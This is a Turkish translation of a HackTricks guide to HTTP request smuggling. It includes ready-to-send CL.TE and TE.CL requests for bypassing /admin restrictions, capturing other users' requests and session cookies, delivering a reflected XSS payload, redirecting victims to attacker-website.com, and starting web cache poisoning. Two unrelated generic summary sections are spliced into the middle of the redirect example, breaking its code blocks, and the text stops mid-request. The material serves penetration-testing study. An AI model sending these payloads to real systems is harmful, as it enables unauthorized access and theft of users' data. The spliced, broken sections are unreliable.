# HTTP İstek Smugglingi / HTTP Desenkronizasyon Saldırısı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanlık seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaşın**, [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek.

</details>

## Nedir

Bu zafiyet, **ön uç proxy'ler** ve **arka uç sunucu** arasındaki **desenkronizasyon** nedeniyle bir **saldırganın** bir HTTP **istek**ini göndermesine izin verir. Bu istek, **ön uç** proxy'ler (yük dengeleyici/ters proxy) tarafından **tek bir istek** olarak **yorumlanırken**, **arka uç** sunucu tarafından **2 istek** olarak **yorumlanır**.\
Bu, bir kullanıcının **kendi sonraki isteğini değiştirmesine** olanak tanır.

### Teori

[**RFC Spesifikasyonu (2161)**](https://tools.ietf.org/html/rfc2616)

> Bir mesaj, hem Transfer-Encoding başlık alanı hem de Content-Length başlık alanı ile alınırsa, ikincisi yoksayılır.

**Content-Length**

> Content-Length varlık başlık alanı, alıcıya gönderilen varlık gövdesinin bayt cinsinden boyutunu belirtir.

**Transfer-Encoding: chunked**

> Transfer-Encoding başlık alanı, yük gövdesini kullanıcıya güvenli bir şekilde aktarmak için kullanılan kodlama biçimini belirtir.\
> Chunked, büyük verilerin bir dizi parçada gönderildiği anlamına gelir.

### Gerçeklik

**Ön uç** (yük dengeleyici / ters proxy) _**content-length**_ veya _**transfer-encoding**_ başlığını işlerken, **arka uç** sunucu **diğerini** işler ve bu, 2 sistem arasında bir **desenkronizasyon** oluşturur.\
Bu, **bir saldırganın ters proxy'ye bir istek göndermesine** izin verir ve bu istek, **arka uç** sunucu tarafından **2 farklı istek olarak yorumlanır**. Bu teknikteki **tehlike**, **arka uç** sunucunun **enjekte edilen 2. isteği** bir sonraki istemciden geldiği gibi **yorumlaması** ve bu istemcinin **gerçek isteğinin** enjekte edilen isteğin bir **parçası** olmasıdır.

### Özellikler

HTTP'de **bir yeni satır karakteri 2 bayttan oluşur**:

* **Content-Length**: Bu başlık, isteğin gövdesinin **bayt** cinsinden **boyutunu** belirtmek için **ondalık bir sayı** kullanır. Gövde, **isteğin son karakteriyle biter, isteğin sonunda yeni bir satıra ihtiyaç yoktur**.
* **Transfer-Encoding:** Bu başlık, **hexadecimal bir sayı** kullanarak **sonraki parçanın** **bayt** cinsinden **boyutunu** belirtir. **Parça**, bir **yeni satır** ile **sonlandırılmalıdır**, ancak bu yeni satır **uzunluk göstergesi tarafından sayılmaz**. Bu aktarım yöntemi, **0 boyutunda bir parça ile 2 yeni satır ile sonlandırılmalıdır**: `0`
* **Connection**: Deneyimime dayanarak, İstek Smuggling'in ilk isteğinde **`Connection: keep-alive`** kullanmanızı öneririm.

## Temel Örnekler

HTTP istek smugling saldırıları, ön uç ve arka uç sunucuların `Content-Length` (CL) ve `Transfer-Encoding` (TE) başlıklarını nasıl yorumladığındaki farklılıkları sömüren belirsiz istekler gönderilerek oluşturulur. Bu saldırılar, temel olarak **CL.TE**, **TE.CL** ve **TE.TE** olarak ortaya çıkar. Her bir tür, ön uç ve arka uç sunucuların bu başlıklara öncelik verme şekillerinin benzersiz bir kombinasyonunu temsil eder. Zafiyetler, sunucuların aynı isteği farklı şekillerde işlemesi nedeniyle ortaya çıkar ve beklenmeyen ve potansiyel olarak zararlı sonuçlara yol açar.

### Temel Zafiyet Türlerinin Örnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Zafiyeti (Ön Uç tarafından Content-Length kullanılır, Arka Uç tarafından Transfer-Encoding kullanılır)
- **Ön Uç (CL):** İsteği `Content-Length` başlığına dayanarak işler.
- **Arka Uç (TE):** İsteği `Transfer-Encoding` başlığına dayanarak işler.
- **Saldırı Senaryosu:**
- Saldırgan, `Content-Length` başlığının değeriyle gerçek içerik uzunluğunun eşleşmediği bir istek gönderir.
- Ön uç sunucusu, `Content-Length` değerine dayanarak tüm isteği arka uca iletilir.
- Arka uç sunucusu, `Transfer-Encoding: chunked` başlığı nedeniyle isteği parçalara ayırarak, kalan veriyi ayrı bir sonraki istek olarak yorumlar.
- **Örnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Zafiyeti (Ön Uç tarafından Transfer-Encoding kullanılır, Arka Uç tarafından Content-Length kullanılır)
- **Ön Uç (TE):** İsteği `Transfer-Encoding` başlığına dayanarak işler.
- **Arka Uç (CL):** İsteği `Content-Length` başlığına dayanarak işler.
- **Saldırı Senaryosu:**
- Saldırgan, parçalı bir istek gönderir, burada parça boyutu (`7b`) ve gerçek içerik uzunluğu (`Content-Length: 4`) hizalanmaz.
- Ön uç sunucusu, `Transfer-Encoding`i onaylayarak tüm isteği arka uca iletilir.
- Arka uç sunucusu, `Content-Length`i dikkate alarak yalnızca isteğin başlangıç kısmını (`7b` bayt) işler ve geri kalanını istenmeyen bir sonraki isteğin bir parçası olarak bırakır.
- **Örnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Zafiyeti (Her ikisi de Transfer-Encoding'i kullanır, ancak obfuskasyon ile biri aldatılabilir)
- **Sunucular:** Her ikisi de `Transfer-Encoding`i destekler, ancak obfuskasyon yoluyla biri bunu görmezden gelebilir.
- **Saldırı Senaryosu:**
- Saldırgan, obfuskasyonlu `Transfer-Encoding` başlıklarını içeren bir istek gönderir.
- Obfuskasyonu tanıyamayan sunucu (ön uç veya arka uç) tarafından belirlenir ve CL.TE veya TE.CL zafiyeti sömürülebilir.
- Bir sunucu tarafından görülen işlenmemiş isteğin bir kısmı, bir sonraki isteğin bir parçası haline gelir ve smuggling'e yol açar.
- **Örnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Her İki Ön Uç ve Arka Uç Tarafından Content-Length Kullanılır):**
- Her iki sunucu da isteği yalnızca `Content-Length` başlığına dayanarak işler.
- Bu senaryo genellikle smuggling'e yol açmaz, çünkü her iki sunucunun isteğin uzunluğunu nasıl yorumladığı konusunda hizalanma vardır.
- **Örnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal İstek
```

#### **CL != 0 Senaryosu:**
- İsteğin gövdesinin içeriği olduğunu gösteren ve sıfırdan farklı bir değere sahip olan `Content-Length` başlığının bulunduğu senaryolara atıfta bulunur.
- Bu, smuggling saldırılarını anlama ve oluşturma açısından önemlidir, çünkü sunucuların bir isteğin sonunu nasıl belirlediğini etkiler.
- **Örnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Boş Olmayan Gövde
```

#### Hop-by-hop başlıklar aracılığıyla zorlama

Hop-by-hop başlıkları kötüye kullanarak, proxy'e **Content-Length veya Transfer-Encoding başlığını silmesini belirtebilir ve böylece bir HTTP isteği smuggling saldırısının kötüye kullanılmasını sağlayabilirsiniz**.
```
Connection: Content-Length
```
Daha fazla bilgi için **hop-by-hop başlıklarını kötüye kullanma** ziyaret edin:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## HTTP İstek Smuggling Bulma

HTTP istek smuggling zafiyetlerini tespit etmek genellikle sunucunun manipüle edilmiş isteklere nasıl yanıt verdiğini gözlemlemeye dayanan zamanlama teknikleri kullanılarak gerçekleştirilebilir. Bu teknikler özellikle CL.TE ve TE.CL zafiyetlerini tespit etmek için kullanışlıdır. Bu yöntemlerin yanı sıra, böyle zafiyetleri bulmak için kullanılabilecek diğer stratejiler ve araçlar vardır:

### CL.TE Zafiyetlerini Zamanlama Teknikleri Kullanarak Bulma
- **Yöntem:**
- Uygulama zafiyetli ise, arka uç sunucunun ek veri beklemesi için bir istek gönderin.
- **Örnek:**
```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Gözlem:**
- Ön uç sunucu isteği `Content-Length`e dayanarak işler ve mesajı erken keser.
- Arka uç sunucu, parçalı bir mesaj bekleyerek, hiç gelmeyen bir sonraki parçayı bekler ve gecikmeye neden olur.

- **Belirtiler:**
- Yanıtta zaman aşımı veya uzun gecikmeler.
- Arka uç sunucudan 400 Bad Request hatası almak, bazen ayrıntılı sunucu bilgileriyle birlikte.

### TE.CL Zafiyetlerini Zamanlama Teknikleri Kullanarak Bulma
- **Yöntem:**
- Uygulama zafiyetli ise, arka uç sunucunun ek veri beklemesi için bir istek gönderin.
- **Örnek:**
```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Gözlem:**
- Ön uç sunucu isteği `Transfer-Encoding`e dayanarak işler ve tüm mesajı ileterek ilerler.
- Arka uç sunucu, `Content-Length`e dayalı bir mesaj bekleyerek, hiç gelmeyen ek veri bekler ve gecikmeye neden olur.

### Zafiyetleri Bulmak İçin Diğer Yöntemler
- **Diferansiyel Yanıt Analizi:**
- Bir isteğin hafifçe değiştirilmiş versiyonlarını gönderin ve sunucu yanıtlarının beklenmedik bir şekilde farklılaşıp farklılaşmadığını gözlemleyin, bu da bir ayrıştırma uyumsuzluğunu gösterir.

- **Otomatik Araçlar Kullanma:**
- Burp Suite'in 'HTTP Request Smuggler' uzantısı gibi araçlar, belirsiz isteklerin çeşitli şekillerini göndererek ve yanıtları analiz ederek bu zafiyetleri otomatik olarak test edebilir.

- **Content-Length Değişkenlik Testleri:**
- Gerçek içerik uzunluğuyla hizalanmayan değişen `Content-Length` değerlerine sahip istekler gönderin ve sunucunun böyle uyumsuzlukları nasıl işlediğini gözlemleyin.

- **Transfer-Encoding Değişkenlik Testleri:**
- Şifrelenmiş veya hatalı biçimlendirilmiş `Transfer-Encoding` başlıklarına sahip istekler gönderin ve ön uç ve arka uç sunucuların böyle manipülasyonlara nasıl farklı yanıt verdiğini izleyin.


### HTTP İstek Smuggling Zafiyet Testi

Zamanlama tekniklerinin etkinliğini doğruladıktan sonra, istemci isteklerinin manipüle edilip edilemeyeceğini doğrulamak önemlidir. Basit bir yöntem, örneğin `/` için bir 404 yanıtı elde etmek için isteklerinizi zehirlemeye çalışmaktır. Önceki olarak tartışılan `CL.TE` ve `TE.CL` örnekleri, istemcinin farklı bir kaynağa erişmeyi amaçlasa bile istemcinin isteğini zehirlemek için nasıl kullanılabileceğini göstermektedir.

**Ana Düşünceler**

Diğer isteklere müdahale ederek istek smuggling zafiyetlerini test ederken aşağıdaki hususları göz önünde bulundurun:

* **Farklı Ağ Bağlantıları:** "Saldırı" ve "normal" istekler ayrı ağ bağlantıları üzerinden gönderilmelidir. Her ikisi için aynı bağlantıyı kullanmak, zafiyetin varlığını doğrulamaz.
* **Tutarlı URL ve Parametreler:** Her iki istek için de aynı URL'leri ve parametre adlarını kullanmaya çalışın. Modern uygulamalar genellikle URL ve parametrelere dayanarak istekleri belirli arka uç sunuculara yönlendirir. Bu eşleşmeler, her iki isteğin aynı sunucu tarafından işlenmesi için gereklidir ve başarılı bir saldırı için bir önkoşuldur.
* **Zamanlama ve Yarış Koşulları:** "Normal" istek, "saldırı" isteğinden kaynaklanan müdahaleyi tespit etmek için diğer eşzamanlı uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteği hemen "saldırı" isteğinden sonra gönderin. Yoğun uygulamalar, kesin zafiyet doğrulaması için birden fazla deneme gerektirebilir.
* **Yük Dengeleme Zorlukları:** Yük dengeleyici olarak hareket eden ön uç sunucular, istekleri çeşitli arka uç sistemlere dağıtabilir. "Saldırı" ve "normal" istekler farklı sistemlere yönlendirilirse, saldırı başarılı olmaz. Bu yük dengeleme yönü, bir zafiyeti doğrulamak için birkaç deneme gerektirebilir.
* **Beklenmeyen Kullanıcı Etkisi:** Saldırınızın yanlışlıkla başka bir kullanıcının isteğini etkilemesi durumunda (tespit için gönderdiğiniz "normal" istek değil), saldırınızın başka bir uygulama kullanıcısını etkilediğini gösterir. Sürekli testler diğer kullanıcıları etkileyebilir, bu nedenle dikkatli bir yaklaşım gerektirebilir.


## HTTP İstek Smuggling Kötüye Kullanma

### Ön uç güvenlik kontrollerini atlatmak için

### HTTP İstek Smuggling Aracılığıyla Ön Uç Güvenliği Geçme

Bazı durumlarda, ön uç proxy'ler gelen istekleri denetleyerek güvenlik önlemleri uygular. Ancak, bu önlemler HTTP İstek Smuggling'i kötüye kullanarak atlanabilir ve kısıtlanmış uç noktalara izinsiz erişim sağlanabilir. Örneğin, `/admin`'e erişim dışarıdan engellenmiş olabilir ve ön uç proxy bu tür girişimleri aktif olarak engelleyebilir. Bununla birlikte, bu proxy, bir HTTP isteği içindeki gömülü istekleri denetlemeyebilir ve bu kısıtlamaları atlamak için bir açık bırakabilir.

Aşağıdaki örnekler, HTTP İstek Smuggling'in ön uç güvenlik kontrollerini atlamak için nasıl kullanılabileceğini, özellikle ön uç proxy tarafından genellikle korunan `/admin` yolunu hedefleyerek göstermektedir:

**CL.TE Örneği**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldırısında, başlangıç isteği için `Content-Length` başlığı kullanılırken, sonraki gömülü istek `Transfer-Encoding: chunked` başlığını kullanır. Ön uç proxy, başlangıç `POST` isteğini işler ancak gömülü `GET /admin` isteğini denetlemez, bu da `/admin` yoluna izinsiz erişime izin verir.

**TE.CL Örneği**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Tersine, TE.CL saldırısında, başlangıçtaki `POST` isteği `Transfer-Encoding: chunked` kullanır ve ardışık gömülü istek, `Content-Length` başlığına dayalı olarak işlenir. CL.TE saldırısına benzer şekilde, ön uç proxy, gizli `GET /admin` isteğini göz ardı ederek sınırlı `/admin` yoluna erişim sağlar.

### Ön uç isteği yeniden yazmayı ortaya çıkarma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uç sunucuya iletmek öncesinde bir **ön uç sunucusu** kullanır. Tipik bir değişiklik, `X-Forwarded-For: <İstemcinin IP'si>` gibi başlıklar eklemektir, böylece istemcinin IP'si arka uca iletilir. Bu değişiklikleri anlamak, **korumaları atlamak** veya **gizli bilgileri veya uç noktaları ortaya çıkarmak** için önemli olabilir.

Bir proxy'nin bir isteği nasıl değiştirdiğini araştırmak için, arka uçtan yanıtta yankılanan bir POST parametresi bulun. Ardından, aşağıdaki gibi bu parametreyi en son kullanarak bir istek oluşturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapıda, ardışık istek bileşenleri `search=`'den sonra eklenir ve bu parametre yanıtta yansıtılır. Bu yansıma, ardışık isteğin başlıklarını ortaya çıkaracaktır.

Gömülü isteğin `Content-Length` başlığını gerçek içerik uzunluğuyla hizalamak önemlidir. Küçük bir değerle başlamak ve giderek artırmak tavsiye edilir, çünkü çok düşük bir değer yansıtılan verileri kesebilirken, çok yüksek bir değer isteğin hata vermesine neden olabilir.

Bu teknik aynı zamanda bir TE.CL zafiyeti bağlamında da uygulanabilir, ancak istek `search=\r\n0` ile sonlandırılmalıdır. Yeni satır karakterlerinden bağımsız olarak, değerler arama parametresine eklenecektir.

Bu yöntem, temel olarak ön uç proxy tarafından yapılan istek değişikliklerini anlamak için kullanılır ve esasen bir öz-yönlendirilen soruşturma gerçekleştirir.

### Diğer kullanıcıların isteklerini yakalama <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST işlemi sırasında bir parametrenin değeri olarak belirli bir isteği ekleyerek, bir sonraki kullanıcının isteklerini yakalamak mümkündür. İşte bunu nasıl başarabilirsiniz:

Aşağıdaki isteği bir parametrenin değeri olarak ekleyerek, sonraki istemci isteğini depolayabilirsiniz:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **yorum parametresi**, herkese açık bir sayfadaki bir gönderinin yorum bölümünde içeriği depolamak için kullanılır. Sonraki isteğin içeriği bir yorum olarak görünecektir.

Ancak, bu teknik sınırlamalara sahiptir. Genellikle, sızdırılan istekte kullanılan parametre ayırıcısına kadar olan verileri yakalar. URL kodlu form gönderimleri için bu ayırıcı `&` karakteridir. Bu, kurban kullanıcının isteğinden yakalanan içeriğin ilk `&` karakterine kadar duracağı anlamına gelir ve hatta sorgu dizgisinin bir parçası olabilir.

Ayrıca, bu yaklaşımın TE.CL zafiyetiyle de mümkün olduğunu belirtmek önemlidir. Bu tür durumlarda, istek `search=\r\n0` ile sonuçlanmalıdır. Yeni satır karakterlerine bakılmaksızın, değerler arama parametresine eklenecektir.

### Yansıtılan XSS'i sömürmek için HTTP isteği sızdırma

HTTP İstek Sızdırma, **Yansıtılan XSS**'e karşı savunmasız web sayfalarını sömürmek için kullanılabilir ve önemli avantajlar sunar:

* Hedef kullanıcılarla etkileşim **gerektirmez**.
* Normalde ulaşılamayan isteklerin bir parçası olan HTTP istek başlıklarında XSS'in sömürülmesine **izin verir**.

Bir web sitesinin User-Agent başlığı aracılığıyla Yansıtılan XSS'e duyarlı olduğu senaryolarda, aşağıdaki yük, bu zafiyeti nasıl sömürüleceğini göstermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Bu payload, zafiyeti sömürmek için aşağıdaki şekilde yapılandırılmıştır:

1. `Transfer-Encoding: chunked` başlığıyla başlayan, görünüşte tipik bir `POST` isteği başlatılır ve bu, smuggling'in başlangıcını gösterir.
2. Chunked mesaj gövdesinin sonunu belirleyen `0` takip eder.
3. Ardından, `User-Agent` başlığına `<script>alert(1)</script>` betiği enjekte edilmiş bir smuggling `GET` isteği tanıtılır ve sunucu bu sonraki isteği işlediğinde XSS tetiklenir.

Smuggling aracılığıyla `User-Agent` manipüle edilerek, payload normal istek kısıtlamalarını bypass eder ve böylece Reflected XSS zafiyetini standart olmayan ancak etkili bir şekilde sömürür.

### Bir site içi yönlendirmeyi açık bir yönlendirmeye dönüştürmek için HTTP isteği smuggling kullanma <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### HTTP İsteği Smuggling ile Site İçi Yönlendirmeleri Sömürme <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle bir URL'den başka bir URL'ye yönlendirme yapmak için yönlendirme URL'sindeki `Host` başlığını kullanır. Bu, Apache ve IIS gibi web sunucularında yaygındır. Örneğin, bir dizin isteği, sonunda bir eğik çizgi olmadan bir yönlendirmeye neden olur:
```
GET /home HTTP/1.1
Host: normal-website.com
```
# HTTP İstek Smugglingi

Bu teknik, bir web uygulamasında HTTP isteklerinin işlenmesi sırasında ortaya çıkan bir güvenlik açığından yararlanır. HTTP istek smugglingi, bir saldırganın isteklerin hedef sunucu tarafından yanlış yorumlanmasına neden olmasını sağlar.

## Nasıl Çalışır?

HTTP istek smugglingi genellikle iki aşamalı bir saldırıdır:

1. İlk aşamada, saldırgan, hedef sunucuya gönderilen isteklerin işlenmesini etkilemek için bir hata kullanır. Bu hata, sunucunun istekleri yanlış yorumlamasına veya yanıtların yanlış bir şekilde yönlendirilmesine neden olabilir.

2. İkinci aşamada, saldırgan, hedef sunucunun istekleri yanlış yorumlamasını veya yanıtları yanlış yönlendirmesini kullanarak, güvenlik duvarını veya diğer güvenlik önlemlerini atlayarak saldırı gerçekleştirir.

## HTTP İstek Smugglingi Türleri

HTTP istek smugglingi için farklı teknikler vardır. İşte bazı yaygın kullanılan teknikler:

- **CL.TE Smuggling**: Bu teknik, "Content-Length" ve "Transfer-Encoding" başlıklarının kombinasyonunu kullanır. Saldırgan, sunucunun istekleri yanlış yorumlamasını sağlamak için bu başlıkları manipüle eder.

- **TE.CL Smuggling**: Bu teknik, "Transfer-Encoding" ve "Content-Length" başlıklarının kombinasyonunu kullanır. Saldırgan, sunucunun istekleri yanlış yorumlamasını sağlamak için bu başlıkları manipüle eder.

- **Chunked Body Smuggling**: Bu teknik, "Transfer-Encoding" başlığını kullanır ve saldırganın istek gövdesini parçalara bölmek için "chunked" kodlamasını kullanmasını gerektirir.

## Saldırı Tespiti ve Önleme

HTTP istek smugglingi saldırılarını tespit etmek ve önlemek için aşağıdaki adımları izleyebilirsiniz:

1. Web uygulamanızı düzenli olarak güncelleyin ve güvenlik açıklarını gidermek için yamaları uygulayın.

2. Web uygulamanızı güvenlik testlerine tabi tutun ve zayıf noktaları tespit etmek için bir pentest gerçekleştirin.

3. Web sunucunuzda güvenlik duvarı ve WAF (Web Uygulama Güvenlik Duvarı) gibi güvenlik önlemleri kullanın.

4. HTTP isteklerini doğru bir şekilde işleyen bir proxy sunucusu kullanarak saldırıları engelleyin.

5. Web sunucunuzun günlüklerini düzenli olarak kontrol edin ve şüpheli aktiviteleri tespit etmek için bir SIEM (Güvenlik Olay ve İncident Yönetimi) çözümü kullanın.

HTTP istek smugglingi saldırılarına karşı dikkatli olmak ve güvenlik önlemlerini uygulamak, web uygulamanızı bu tür saldırılardan koruyacaktır.
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Görünüşte zararsız olsa da, bu davranış HTTP isteklerini sızdırarak kullanıcıları harici bir siteye yönlendirmek için manipüle edilebilir. Örneğin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaçak istek, işlenen sonraki kullanıcı isteğinin bir saldırgan tarafından kontrol edilen bir web sitesine yönlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
# HTTP İstek Smugglingi

Bu teknik, bir web uygulamasında HTTP isteklerinin işlenmesi sırasında ortaya çıkan bir güvenlik açığından yararlanır. HTTP istek smugglingi saldırısı, bir saldırganın hedef web sunucusuna yanıt olarak farklı bir şekilde yorumlanan iki veya daha fazla HTTP isteği göndermesini içerir.

## HTTP İstek Smugglingi Nasıl Çalışır?

HTTP istek smugglingi saldırısı, genellikle web sunucusu ve ön uç sunucu (örneğin bir yük dengeleyici) arasındaki iletişimdeki farklılıklardan kaynaklanır. Bu farklılıklar, saldırganın istekleri hedef sunucuya yanıt olarak farklı şekillerde yorumlamasına izin verir.

Saldırgan, hedef web sunucusuna gönderilen isteklerin bir kısmını manipüle ederek, sunucunun bu istekleri yanıtlarken farklı bir şekilde yorumlamasını sağlar. Bu, saldırganın güvenlik duvarını aşmasına, oturumları ele geçirmesine veya hassas verilere erişmesine olanak tanır.

## HTTP İstek Smugglingi Türleri

HTTP istek smugglingi saldırıları farklı şekillerde gerçekleştirilebilir. İşte bazı yaygın saldırı türleri:

- **CL.TE Smugglingi**: Bu saldırı türünde, saldırgan bir isteği "Content-Length" ve "Transfer-Encoding" başlıklarını manipüle ederek hedef sunucuya gönderir. Bu, sunucunun isteği yanıtlarken farklı şekillerde yorumlamasına neden olabilir.

- **TE.CL Smugglingi**: Bu saldırı türünde, saldırgan bir isteği "Transfer-Encoding" ve "Content-Length" başlıklarını manipüle ederek hedef sunucuya gönderir. Bu da sunucunun isteği yanıtlarken farklı şekillerde yorumlamasına yol açabilir.

- **Chunked Body Smugglingi**: Bu saldırı türünde, saldırgan bir isteği "Transfer-Encoding" başlığını manipüle ederek hedef sunucuya gönderir. Bu, sunucunun isteği yanıtlarken farklı şekillerde yorumlamasına neden olabilir.

## HTTP İstek Smugglingi Saldırısını Önleme

HTTP istek smugglingi saldırılarını önlemek için aşağıdaki adımları takip edebilirsiniz:

- Web sunucusu ve ön uç sunucu arasındaki iletişimi düzgün bir şekilde yapılandırın ve güncelleyin.

- Web sunucusunda güvenlik duvarı ve filtreleme önlemleri uygulayın.

- Web uygulamasını düzenli olarak güncelleyin ve güvenlik açıklarını düzeltin.

- HTTP isteklerini doğrulamak ve doğrulanmamış istekleri reddetmek için uygun güvenlik önlemlerini uygulayın.

## Daha Fazla Bilgi

Daha fazla bilgi için [HTTP İstek Smugglingi](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling) bölümünü ziyaret edebilirsiniz.
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Bu senaryoda, bir kullanıcının JavaScript dosyası isteği ele geçirilir. Saldırgan, yanıt olarak kötü amaçlı JavaScript sunarak kullanıcının tehlikeye girmesine neden olabilir.


### Web Önbellek Zehirlenmesi İçin HTTP İstek Kaçırma Kullanma <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### HTTP İstek Kaçırma ile Web Önbellek Zehirlenmesi Sömürüsü <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web önbellek zehirlenmesi, genellikle performansı artırmak için **ön uç altyapısının içeriği önbelleğe alması** durumunda gerçekleştirilebilir. Sunucunun yanıtını manipüle ederek, **önbelleği zehirlemek** mümkündür.

Daha önce, sunucu yanıtlarının bir 404 hatası döndürmek üzere değiştirilebileceğini gözlemlemiştik (bkz. [Temel Örnekler](./#basic-examples)). Benzer şekilde, sunucuyu `/static/include.js` isteği için `/index.html` içeriğini yanıt olarak teslim etmeye kandırmak mümkündür. Sonuç olarak, `/static/include.js` içeriği, önbellekte `/index.html` ile değiştirilir ve kullanıcılara erişilemez hale gelir, bu da Potansiyel olarak Hizmet Reddi (DoS) saldırısına yol açabilir.

Bu teknik, bir **Açık Yönlendirme açığı** keşfedildiğinde veya bir **açık yönlendirmeye yönlendirme** olduğunda özellikle etkili hale gelir. Bu tür güvenlik açıkları, `/static/include.js` önbelleğindeki içeriği saldırganın kontrolündeki bir betikle değiştirmek için sömürülebilir ve güncellenen `/static/include.js` isteğinde bulunan tüm istemcilere karşı yaygın bir Çapraz Site Komut Dosyası (XSS) saldırısını mümkün kılar.

Aşağıda, **bir açık yönlendirmeye yönlendirme ile önbellek zehirlenmesinin sömürülmesi**nin bir örneği verilmiştir. Amaç, `/static/include.js` önbellek içeriğini saldırganın kontrol ettiği JavaScript kodunu sunacak şekilde değiştirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
